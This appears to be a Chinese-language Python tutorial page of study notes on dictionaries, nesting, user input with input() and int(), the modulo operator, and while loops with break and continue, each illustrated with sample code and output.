<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#alien.py</span></span><br><span class="line">alien_0 = &#123;<span class="string">&#x27;color&#x27;</span>:<span class="string">&#x27;green&#x27;</span>,<span class="string">&#x27;speed&#x27;</span>:<span class="string">&#x27;slow&#x27;</span>&#125;</span><br><span class="line">print_value = alien_0.get(<span class="string">&#x27;points&#x27;</span>,<span class="string">&#x27;No point value assigned.&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(print_value)</span><br></pre></td></tr></table></figure>

<blockquote>
<p>如果字典中有键’points’，则获取键关联的值，否则将获取指定的默认值。</p>
<p>在调用get()函数时，如果没有指定第二个参数且指定的键不存在，则Python将放回None。</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">No point value asigned.</span><br></pre></td></tr></table></figure>

<h3 id="遍历字典"><a href="#遍历字典" class="headerlink" title="遍历字典"></a>遍历字典</h3><ol>
<li><strong>遍历所有的键值对</strong></li>
</ol>
<p>利用for 循环，借用两个变量分别保存键名和值，items()返回键-值对列表</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#user.pu</span></span><br><span class="line">user_0 =&#123;</span><br><span class="line">    <span class="string">&#x27;username&#x27;</span>:<span class="string">&#x27;efermi&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;first&#x27;</span>:<span class="string">&#x27;enrico&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;last&#x27;</span>:<span class="string">&#x27;fermi&#x27;</span>,</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> key,value <span class="keyword">in</span> user_0.items():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;\n key:<span class="subst">&#123;key&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;\n value:<span class="subst">&#123;value&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">key: last</span><br><span class="line">Value: fermi</span><br><span class="line">Key: first</span><br><span class="line">Value: enrico</span><br><span class="line">Key: username</span><br><span class="line">Value: efermi</span><br></pre></td></tr></table></figure>

<blockquote>
<p>注意，即便遍历字典时，键—值对的返回顺序也与存储顺序不同。Python不关心键—值对的存<br>储顺序，而只跟踪键和值之间的关联关系。</p>
</blockquote>
<ol start="2">
<li><strong>遍历所有的键</strong></li>
</ol>
<blockquote>
<p>利用for 循环，用一个变量保存字典的键名，keys()</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#favorite_languages</span></span><br><span class="line">favorite_languages = &#123;</span><br><span class="line">    <span class="string">&#x27;jen&#x27;</span>: <span class="string">&#x27;python&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;sarah&#x27;</span>: <span class="string">&#x27;c&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;edward&#x27;</span>: <span class="string">&#x27;ruby&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;phil&#x27;</span>: <span class="string">&#x27;python&#x27;</span>,</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> name <span class="keyword">in</span> favorite_languages.keys():</span><br><span class="line">	<span class="built_in">print</span>(name.title())</span><br></pre></td></tr></table></figure>

<blockquote>
<p>提取字典favorite_languages中的所有键，并依次将它们存储到变量name中。输出列出了每个被调查者的名字：</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Jen</span><br><span class="line">Sarah</span><br><span class="line">Phil</span><br><span class="line">Edward</span><br></pre></td></tr></table></figure>

<blockquote>
<p>遍历字典时，会默认遍历所有的键.</p>
<p>因此，如果将上述代码中的for name in favorite_languages.keys():替换为for name in favorite_languages:，输出将不变。</p>
</blockquote>
<ul>
<li><p>按顺序遍历字典中的所有键</p>
<p>字典总是明确地记录键和值之间的关联关系，但获取字典的元素时，获取顺序是不可预测的。</p>
<p>要以特定的顺序返回元素，一种办法是在for循环中对返回的键进行排序。为此，可使用函<br>数sorted()来获得按特定顺序排列的键列表的副本：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#favorite_languages.py</span></span><br><span class="line">favorite_languages = &#123;</span><br><span class="line">    <span class="string">&#x27;jen&#x27;</span>: <span class="string">&#x27;python&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;sarah&#x27;</span>: <span class="string">&#x27;c&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;edward&#x27;</span>: <span class="string">&#x27;ruby&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;phil&#x27;</span>: <span class="string">&#x27;python&#x27;</span>,</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> name <span class="keyword">in</span> <span class="built_in">sorted</span>(favorite_languages.keys()):</span><br><span class="line">	<span class="built_in">print</span>(name.title() + <span class="string">&quot;, thank you for taking the poll.&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>dictionary.keys()的结果调用了函数sorted()。这让Python列出字典中的所有键，并在遍历前对这个列表进行排序。输出表明，按顺序显示了所有被调查者的名字：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Edward, thank you <span class="keyword">for</span> taking the poll.</span><br><span class="line">Jen, thank you <span class="keyword">for</span> taking the poll.</span><br><span class="line">Phil, thank you <span class="keyword">for</span> taking the poll.</span><br><span class="line">Sarah, thank you <span class="keyword">for</span> taking the poll.</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="遍历字典中的所有值"><a href="#遍历字典中的所有值" class="headerlink" title="遍历字典中的所有值"></a>遍历字典中的所有值</h3><p>利用for循环，用一个变量存储字典的值，values();set()集合，剔除重复项。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#favorite_languages.py</span></span><br><span class="line">favorite_languages = &#123;</span><br><span class="line">    <span class="string">&#x27;jen&#x27;</span>: <span class="string">&#x27;python&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;sarah&#x27;</span>: <span class="string">&#x27;c&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;edward&#x27;</span>: <span class="string">&#x27;ruby&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;phil&#x27;</span>: <span class="string">&#x27;python&#x27;</span>,</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;The following languages have been mentioned:&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> language <span class="keyword">in</span> <span class="built_in">set</span>(favorite_languages.values()):</span><br><span class="line">    <span class="comment">#为剔除重复项，可使用集合（set）。集合类似于列表，但每个元素都必须是独一无二的：</span></span><br><span class="line">    <span class="built_in">print</span>(language.title())</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">The following languages have been mentioned:</span><br><span class="line">Python</span><br><span class="line">C</span><br><span class="line">Ruby</span><br></pre></td></tr></table></figure>

<h2 id="嵌套"><a href="#嵌套" class="headerlink" title="嵌套"></a>嵌套</h2><blockquote>
<p>可以在列表中嵌套字典、在字典中嵌套列表，可以在字典中嵌套字典。</p>
</blockquote>
<h3 id="字典列表"><a href="#字典列表" class="headerlink" title="字典列表"></a>字典列表</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#alien.py</span></span><br><span class="line">alien_0 = &#123;<span class="string">&#x27;color&#x27;</span>: <span class="string">&#x27;green&#x27;</span>, <span class="string">&#x27;points&#x27;</span>: <span class="number">5</span>&#125;</span><br><span class="line">alien_1 = &#123;<span class="string">&#x27;color&#x27;</span>: <span class="string">&#x27;yellow&#x27;</span>, <span class="string">&#x27;points&#x27;</span>: <span class="number">10</span>&#125;</span><br><span class="line">alien_2 = &#123;<span class="string">&#x27;color&#x27;</span>: <span class="string">&#x27;red&#x27;</span>, <span class="string">&#x27;points&#x27;</span>: <span class="number">15</span>&#125;</span><br><span class="line">aliens = [alien_0, alien_1, alien_2]</span><br><span class="line"><span class="keyword">for</span> alien <span class="keyword">in</span> aliens:</span><br><span class="line">	<span class="built_in">print</span>(alien)</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#x27;color&#x27;: &#x27;green&#x27;, &#x27;points&#x27;: 5&#125;</span><br><span class="line">&#123;&#x27;color&#x27;: &#x27;yellow&#x27;, &#x27;points&#x27;: 10&#125;</span><br><span class="line">&#123;&#x27;color&#x27;: &#x27;red&#x27;, &#x27;points&#x27;: 15&#125;</span><br></pre></td></tr></table></figure>

<p>将前三个外星人修改为黄色的、速度为中等且值10个点</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#alien.py</span></span><br><span class="line"><span class="comment"># 创建一个用于存储外星人的空列表</span></span><br><span class="line">aliens = []</span><br><span class="line"><span class="comment"># 创建30个绿色的外星人</span></span><br><span class="line"><span class="keyword">for</span> alien_number <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">30</span>):</span><br><span class="line"> new_alien = &#123;<span class="string">&#x27;color&#x27;</span>: <span class="string">&#x27;green&#x27;</span>, <span class="string">&#x27;points&#x27;</span>: <span class="number">5</span>, <span class="string">&#x27;speed&#x27;</span>: <span class="string">&#x27;slow&#x27;</span>&#125;</span><br><span class="line"> aliens.append(new_alien)</span><br><span class="line"><span class="comment">#将前三个外星人修改为黄色的、速度为中等且值10个点</span></span><br><span class="line"><span class="keyword">for</span> alien <span class="keyword">in</span> aliens[<span class="number">0</span>:<span class="number">3</span>]:</span><br><span class="line">    <span class="keyword">if</span> alien[<span class="string">&#x27;color&#x27;</span>] == <span class="string">&#x27;green&#x27;</span>:</span><br><span class="line">        alien[<span class="string">&#x27;color&#x27;</span>] = <span class="string">&#x27;yellow&#x27;</span></span><br><span class="line">        alien[<span class="string">&#x27;speed&#x27;</span>] = <span class="string">&#x27;medium&#x27;</span></span><br><span class="line">        alien[<span class="string">&#x27;points&#x27;</span>] = <span class="number">10</span></span><br><span class="line"><span class="comment"># 显示前五个外星人</span></span><br><span class="line"><span class="keyword">for</span> alien <span class="keyword">in</span> aliens[:<span class="number">5</span>]:</span><br><span class="line">    <span class="built_in">print</span>(alien)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;...&quot;</span>)</span><br><span class="line"><span class="comment"># 显示创建了多少个外星人</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Total number of aliens: &quot;</span> + <span class="built_in">str</span>(<span class="built_in">len</span>(aliens)))</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&#123;<span class="string">&#x27;speed&#x27;</span>: <span class="string">&#x27;medium&#x27;</span>, <span class="string">&#x27;color&#x27;</span>: <span class="string">&#x27;yellow&#x27;</span>, <span class="string">&#x27;points&#x27;</span>: 10&#125;</span><br><span class="line">&#123;<span class="string">&#x27;speed&#x27;</span>: <span class="string">&#x27;medium&#x27;</span>, <span class="string">&#x27;color&#x27;</span>: <span class="string">&#x27;yellow&#x27;</span>, <span class="string">&#x27;points&#x27;</span>: 10&#125;</span><br><span class="line">&#123;<span class="string">&#x27;speed&#x27;</span>: <span class="string">&#x27;medium&#x27;</span>, <span class="string">&#x27;color&#x27;</span>: <span class="string">&#x27;yellow&#x27;</span>, <span class="string">&#x27;points&#x27;</span>: 10&#125;</span><br><span class="line">&#123;<span class="string">&#x27;speed&#x27;</span>: <span class="string">&#x27;slow&#x27;</span>, <span class="string">&#x27;color&#x27;</span>: <span class="string">&#x27;green&#x27;</span>, <span class="string">&#x27;points&#x27;</span>: 5&#125;</span><br><span class="line">&#123;<span class="string">&#x27;speed&#x27;</span>: <span class="string">&#x27;slow&#x27;</span>, <span class="string">&#x27;color&#x27;</span>: <span class="string">&#x27;green&#x27;</span>, <span class="string">&#x27;points&#x27;</span>: 5&#125;</span><br><span class="line">...</span><br><span class="line">Total number of aliens: 30</span><br></pre></td></tr></table></figure>

<h3 id="字典中存储列表"><a href="#字典中存储列表" class="headerlink" title="字典中存储列表"></a>字典中存储列表</h3><blockquote>
<p>在字典中将一个键关联到多个值时，可以在字典中嵌套一个列表.</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#Pizza.py</span></span><br><span class="line"><span class="comment"># 存储所点比萨的信息</span></span><br><span class="line"> pizza = &#123;</span><br><span class="line"><span class="string">&#x27;crust&#x27;</span>: <span class="string">&#x27;thick&#x27;</span>,<span class="comment">#薄厚程度</span></span><br><span class="line"><span class="string">&#x27;toppings&#x27;</span>: [<span class="string">&#x27;mushrooms&#x27;</span>, <span class="string">&#x27;extra cheese&#x27;</span>],<span class="comment">#顾客要求添加的所有配料</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment"># 概述所点的比萨</span></span><br><span class="line"> <span class="built_in">print</span>(<span class="string">&quot;You ordered a &quot;</span> + pizza[<span class="string">&#x27;crust&#x27;</span>] + <span class="string">&quot;-crust pizza &quot;</span> +</span><br><span class="line"><span class="string">&quot;with the following toppings:&quot;</span>)</span><br><span class="line"> <span class="keyword">for</span> topping <span class="keyword">in</span> pizza[<span class="string">&#x27;toppings&#x27;</span>]:</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\t&quot;</span> + topping)</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">You ordered a thick-crust pizza with the following toppings:</span><br><span class="line">    mushrooms</span><br><span class="line">    extra cheese</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#favorite_languages.py</span></span><br><span class="line">favorite_languages = &#123;</span><br><span class="line">    <span class="string">&#x27;jen&#x27;</span>: [<span class="string">&#x27;python&#x27;</span>, <span class="string">&#x27;ruby&#x27;</span>],</span><br><span class="line">    <span class="string">&#x27;sarah&#x27;</span>: [<span class="string">&#x27;c&#x27;</span>],</span><br><span class="line">    <span class="string">&#x27;edward&#x27;</span>: [<span class="string">&#x27;ruby&#x27;</span>, <span class="string">&#x27;go&#x27;</span>],</span><br><span class="line">    <span class="string">&#x27;phil&#x27;</span>: [<span class="string">&#x27;python&#x27;</span>, <span class="string">&#x27;haskell&#x27;</span>],</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> name, languages <span class="keyword">in</span> favorite_languages.items():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\n&quot;</span> + name.title() + <span class="string">&quot;&#x27;s favorite languages are:&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> language <span class="keyword">in</span> languages:</span><br><span class="line">		<span class="built_in">print</span>(<span class="string">&quot;\t&quot;</span> + language.title())</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Jen<span class="string">&#x27;s favorite languages are:</span></span><br><span class="line"><span class="string">    Python</span></span><br><span class="line"><span class="string">    Ruby</span></span><br><span class="line"><span class="string">Sarah&#x27;</span>s favorite languages are:</span><br><span class="line">    C</span><br><span class="line">Phil<span class="string">&#x27;s favorite languages are:</span></span><br><span class="line"><span class="string">    Python</span></span><br><span class="line"><span class="string">    Haskell</span></span><br><span class="line"><span class="string">Edward&#x27;</span>s favorite languages are:</span><br><span class="line">    Ruby</span><br><span class="line">    Go</span><br></pre></td></tr></table></figure>

<h3 id="字典中存储字典"><a href="#字典中存储字典" class="headerlink" title="字典中存储字典"></a>字典中存储字典</h3><blockquote>
<p>例如，如果有多个网站用户，每个都有独特的用户名，可在字典中将用户名作为键，然后将每位用户的信息存储在一个字典中，并将该字典作为与用户名相关联的值。在下面的程序中，对于每位用户，我们都存储了其三项信息：名、姓和居地；为访问这些信息，我们遍历所有的用户名，并访问与每个用户名相关联的信息字典：</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#many_users.py</span></span><br><span class="line">users = &#123;</span><br><span class="line">    <span class="string">&#x27;aeinstein&#x27;</span>: &#123;</span><br><span class="line">        <span class="string">&#x27;first&#x27;</span>: <span class="string">&#x27;albert&#x27;</span>,<span class="comment">#名字</span></span><br><span class="line">        <span class="string">&#x27;last&#x27;</span>: <span class="string">&#x27;einstein&#x27;</span>,<span class="comment">#姓氏</span></span><br><span class="line">        <span class="string">&#x27;location&#x27;</span>: <span class="string">&#x27;princeton&#x27;</span>,</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="string">&#x27;mcurie&#x27;</span>: &#123;</span><br><span class="line">        <span class="string">&#x27;first&#x27;</span>: <span class="string">&#x27;marie&#x27;</span>,<span class="comment">#名字</span></span><br><span class="line">        <span class="string">&#x27;last&#x27;</span>: <span class="string">&#x27;curie&#x27;</span>,<span class="comment">#姓氏</span></span><br><span class="line">        <span class="string">&#x27;location&#x27;</span>: <span class="string">&#x27;paris&#x27;</span>,</span><br><span class="line">    &#125;,</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> username, user_info <span class="keyword">in</span> users.items():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\nUsername: &quot;</span> + username)</span><br><span class="line">    full_name = user_info[<span class="string">&#x27;first&#x27;</span>] + <span class="string">&quot; &quot;</span> + user_info[<span class="string">&#x27;last&#x27;</span>]</span><br><span class="line">    location = user_info[<span class="string">&#x27;location&#x27;</span>]</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\tFull name: &quot;</span> + full_name.title())</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\tLocation: &quot;</span> + location.title())</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Username: aeinstein</span><br><span class="line">    Full name: Albert Einstein</span><br><span class="line">    Location: Princeton</span><br><span class="line">Username: mcurie</span><br><span class="line">    Full name: Marie Curie</span><br><span class="line">    Location: Paris</span><br></pre></td></tr></table></figure>

<h2 id="用户输入"><a href="#用户输入" class="headerlink" title="用户输入"></a>用户输入</h2><h3 id="文本输入input-函数"><a href="#文本输入input-函数" class="headerlink" title="文本输入input()函数"></a>文本输入input()函数</h3><blockquote>
<p><strong>函数input()让程序暂停运行，等待用户输入一些文本。获取用户输入Python将其存储在一个变量中。<u>input()函数获取的将被视为字符串，即使输入的文本为数字，也将以字符串的形式存储。</u></strong></p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#greeter.py</span></span><br><span class="line">prompt = <span class="string">&quot;If you tell us who you are, we can personalize the messages you see.&quot;</span></span><br><span class="line"><span class="comment">#运算符+=在存储在prompt中的字符串末尾附加一个字符串。</span></span><br><span class="line">prompt += <span class="string">&quot;\nWhat is your first name? &quot;</span></span><br><span class="line">name = <span class="built_in">input</span>(prompt)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\nHello, &quot;</span> + name + <span class="string">&quot;!&quot;</span>)</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">If you tell us <span class="built_in">who</span> you are, we can personalize the messages you see.</span><br><span class="line">What is your first name? Eric</span><br><span class="line"></span><br><span class="line">Hello, Eric!</span><br></pre></td></tr></table></figure>

<h3 id="获取数值输入int-函数"><a href="#获取数值输入int-函数" class="headerlink" title="获取数值输入int()函数"></a>获取数值输入int()函数</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt; age = input(<span class="string">&quot;How old are you? &quot;</span>)</span><br><span class="line">How old are you? 21</span><br><span class="line">&gt;&gt;&gt; age</span><br><span class="line"><span class="string">&#x27;21&#x27;</span><span class="comment">#返回的是&#x27;21&#x27;——用户输入的数值的字符串表示。</span></span><br><span class="line">&gt;&gt;&gt; age &gt;= 18</span><br><span class="line">Traceback (most recent call last):<span class="comment">#报错提示</span></span><br><span class="line">	File <span class="string">&quot;&lt;stdin&gt;&quot;</span>, line 1, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">TypeError: unorderable types: str() &gt;= int()</span><br></pre></td></tr></table></figure>

<blockquote>
<p><u>Traceback (most recent call last):#报错提示</u></p>
<p><u><strong>TypeError: unorderable types: str() &gt;&#x3D; int()</strong></u></p>
<p>无法将字符串和整数进行比较：不能将存储在age中的字符串’21’与数值18进行比较</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt; age = input(<span class="string">&quot;How old are you? &quot;</span>)</span><br><span class="line">How old are you? 21</span><br><span class="line">&gt;&gt;&gt; age = int(age)<span class="comment">#int()函数将字符串强制转换成数值</span></span><br><span class="line">&gt;&gt;&gt; age &gt;= 18</span><br><span class="line">True</span><br></pre></td></tr></table></figure>

<h3 id="求模运算-取余运算"><a href="#求模运算-取余运算" class="headerlink" title="求模运算(%)[取余运算]"></a>求模运算(%)[取余运算]</h3><blockquote>
<p>求模运算符（%）是一个很有用的工具，它将两个数相除并返回<u><strong>余数</strong></u>：</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt; 4 % 3</span><br><span class="line">1</span><br><span class="line">&gt;&gt;&gt; 5 % 3</span><br><span class="line">2</span><br><span class="line">&gt;&gt;&gt; 6 % 3</span><br><span class="line">0</span><br><span class="line">&gt;&gt;&gt; 7 % 3</span><br><span class="line">1</span><br></pre></td></tr></table></figure>

<blockquote>
<p>如果一个数可被另一个数整除，余数就为0，因此求模运算符将返回0。你可利用这一点来判<br>断一个数是奇数还是偶数：</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#even_or_odd.py</span></span><br><span class="line">number = <span class="built_in">input</span>(<span class="string">&quot;Enter a number, and I&#x27;ll tell you if it&#x27;s even or odd: &quot;</span>)</span><br><span class="line">number = <span class="built_in">int</span>(number)</span><br><span class="line"><span class="keyword">if</span> number % <span class="number">2</span> == <span class="number">0</span>:<span class="comment">#偶数</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\nThe number &quot;</span> + <span class="built_in">str</span>(number) + <span class="string">&quot; is even.&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:<span class="comment">#奇数</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\nThe number &quot;</span> + <span class="built_in">str</span>(number) + <span class="string">&quot; is odd.&quot;</span>)</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Enter a number, and I<span class="string">&#x27;ll tell you if it&#x27;</span>s even or odd: 42</span><br><span class="line">The number 42 is even.</span><br></pre></td></tr></table></figure>

<h2 id="While-循环"><a href="#While-循环" class="headerlink" title="While()循环"></a>While()循环</h2><blockquote>
<p>for循环用于针对集合中的每个元素都一个代码块，而while循环不断地运行，直到指定的条<br>件不满足为止。</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">current_number = <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> current_number &lt;= <span class="number">5</span>:</span><br><span class="line">    <span class="built_in">print</span>(current_number,end=<span class="string">&#x27;,&#x27;</span>)</span><br><span class="line">    current_number += <span class="number">1</span></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1,2,3,4,5</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#让用户自己选择是否需要继续</span></span><br><span class="line"><span class="comment">#parrot.py</span></span><br><span class="line">prompt = <span class="string">&quot;\nTell me something, and I will repeat it back to you:&quot;</span></span><br><span class="line">prompt += <span class="string">&quot;\nEnter &#x27;quit&#x27; to end the program. &quot;</span></span><br><span class="line">message = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">while</span> message != <span class="string">&#x27;quit&#x27;</span>:</span><br><span class="line">	message = <span class="built_in">input</span>(prompt)</span><br><span class="line">	<span class="built_in">print</span>(message)</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Tell me something, and I will repeat it back to you:</span><br><span class="line">Enter <span class="string">&#x27;quit&#x27;</span> to end the program. Hello everyone!</span><br><span class="line">Hello everyone!</span><br><span class="line">Tell me something, and I will repeat it back to you:</span><br><span class="line">Enter <span class="string">&#x27;quit&#x27;</span> to end the program. Hello again.</span><br><span class="line">Hello again.</span><br><span class="line">Tell me something, and I will repeat it back to you:</span><br><span class="line">Enter <span class="string">&#x27;quit&#x27;</span> to end the program. quit</span><br><span class="line">quit</span><br></pre></td></tr></table></figure>

<blockquote>
<p>使用标志，改变标志控制循环</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#parrot.py</span></span><br><span class="line">prompt = <span class="string">&quot;\nTell me something, and I will repeat it back to you:&quot;</span></span><br><span class="line">prompt += <span class="string">&quot;\nEnter &#x27;quit&#x27; to end the program. &quot;</span></span><br><span class="line">active = <span class="literal">True</span></span><br><span class="line"><span class="keyword">while</span> active:</span><br><span class="line">	message = <span class="built_in">input</span>(prompt)</span><br><span class="line"> 	<span class="keyword">if</span> message == <span class="string">&#x27;quit&#x27;</span>:</span><br><span class="line">		active = <span class="literal">False</span></span><br><span class="line"> 	<span class="keyword">else</span>:</span><br><span class="line">	<span class="built_in">print</span>(message)</span><br></pre></td></tr></table></figure>

<h3 id="使用break结束循环"><a href="#使用break结束循环" class="headerlink" title="使用break结束循环"></a>使用break结束循环</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#cities.py</span></span><br><span class="line">prompt = <span class="string">&quot;\nPlease enter the name of a city you have visited:&quot;</span></span><br><span class="line">prompt += <span class="string">&quot;\n(Enter &#x27;quit&#x27; when you are finished.) &quot;</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">	city = <span class="built_in">input</span>(prompt)</span><br><span class="line">	<span class="keyword">if</span> city == <span class="string">&#x27;quit&#x27;</span>:</span><br><span class="line">		<span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;I&#x27;d love to go to &quot;</span> + city.title() + <span class="string">&quot;!&quot;</span>)</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Please enter the name of a city you have visited:</span><br><span class="line">(Enter <span class="string">&#x27;quit&#x27;</span> when you are finished.) New York</span><br><span class="line">I<span class="string">&#x27;d love to go to New York!</span></span><br><span class="line"><span class="string">Please enter the name of a city you have visited:</span></span><br><span class="line"><span class="string">(Enter &#x27;</span>quit<span class="string">&#x27; when you are finished.) San Francisco</span></span><br><span class="line"><span class="string">I&#x27;</span>d love to go to San Francisco!</span><br><span class="line">Please enter the name of a city you have visited:</span><br><span class="line">(Enter <span class="string">&#x27;quit&#x27;</span> when you are finished.) quit</span><br></pre></td></tr></table></figure>

<h3 id="使用continue结束本层循环，继续下一次循环"><a href="#使用continue结束本层循环，继续下一次循环" class="headerlink" title="使用continue结束本层循环，继续下一次循环"></a>使用continue结束本层循环，继续下一次循环</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#counting.py</span></span><br><span class="line">current_number = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> current_number &lt; <span class="number">10</span>:</span><br><span class="line">	current_number += <span class="number">1</span></span><br><span class="line">	<span class="keyword">if</span> current_number % <span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">		<span class="keyword">continue</span></span><br><span class="line">	<span class="built_in">print</span>(current_number,end=<span class="string">&#x27; &#x27;</span>)</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">1 3 5 7 9</span><br></pre></td></tr></table></figure>

<h3 id="使用while循环操作列表"><a href="#使用while循环操作列表" class="headerlink" title="使用while循环操作列表"></a>使用while循环操作列表</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#confirmed_users.py</span></span><br><span class="line">unconfirmed_user = [<span class="string">&#x27;alice&#x27;</span>, <span class="string">&#x27;brian&#x27;</span>, <span class="string">&#x27;candace&#x27;</span>]</span><br><span class="line">confirmed_users = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> unconfirmed_users:</span><br><span class="line">    current_user = unconfirmed_users.pop()</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&quot;Verifying user: &quot;</span> + current_user.title())</span><br><span class="line"> 	confirmed_users.append(current_user)</span><br><span class="line"><span class="comment"># 显示所有已验证的用户</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\nThe following users have been confirmed:&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> confirmed_user <span class="keyword">in</span> confirmed_users:</span><br><span class="line"><span class="built_in">print</span>(confirmed_user.title())</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Verifying user: Candace</span><br><span class="line">Verifying user: Brian</span><br><span class="line">Verifying user: Alice</span><br><span class="line">The following <span class="built_in">users</span> have been confirmed:</span><br><span class="line">Candace</span><br><span class="line">Brian</span><br><span class="line">Alice</span><br></pre></td></tr></table></figure>

